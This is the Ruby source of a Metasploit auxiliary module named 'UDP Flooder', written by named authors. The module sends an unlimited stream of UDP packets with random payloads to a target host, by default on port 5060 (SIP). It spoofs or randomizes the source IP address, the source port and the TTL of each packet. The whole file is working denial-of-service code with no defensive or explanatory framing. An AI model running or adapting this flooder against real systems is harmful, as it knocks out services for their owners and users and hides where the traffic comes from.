require 'msf/core'

class Metasploit3 < Msf::Auxiliary

    include Msf::Auxiliary::Dos
    include Msf::Exploit::Capture

    def initialize
        super(
            'Name'			=>	'UDP Flooder',
            'Description'	=>	'A simple UDP flooder',
            'Author'		=>
            [
				'Roi Mallo',
				'Jesus Perez <jesusprubio[at]gmail.com>'
			],
			'License'		=> MSF_LICENSE,
			'Version'		=> '$Revision: 0 $'
        )


        register_options(
        [
            Opt::RPORT(5060),
            OptAddress.new('SHOST', [false, 'The spoofable source address (else randomizes)']),
            OptInt.new('SPORT', [false, 'The source port (else randomizes)']),
            OptInt.new('NUM', [false, 'Number of UDP packets to send (else unlimited)']),
            OptInt.new('SIZE', [false, 'Size of UDP packets to send (else 256 bytes)'])
        ], self.class)

        deregister_options('FILTER','PCAPFILE','SNAPLEN')
    end

    def sport
        datastore['SPORT'].to_i.zero? ? rand(65535)+1 : datastore['SPORT'].to_i
    end

    def rport
        datastore['RPORT'].to_i
    end

    def srchost
        datastore['SHOST'] || [rand(0x100000000)].pack('N').unpack('C*').join('.')
    end

    def size
        datastore['SIZE'].to_i.zero? ? 256 : datastore['SIZE'].to_i
    end

    def run
        open_pcap

        sent = 0
        num = datastore['NUM']

        print_status("UDP flooding #{rhost}:#{rport}...")

        p = PacketFu::UDPPacket.new
        p.ip_daddr = rhost
        p.udp_dport = rport

        while (num <= 0) or (sent < num)
            p.ip_ttl = rand(128)+128
            p.ip_saddr = srchost
            p.udp_sport = sport
            p.payload = rand(36**size).to_s(36)
            p.recalc
            capture_sendto(p,rhost)
            sent += 1
        end

        close_pcap
    end
end
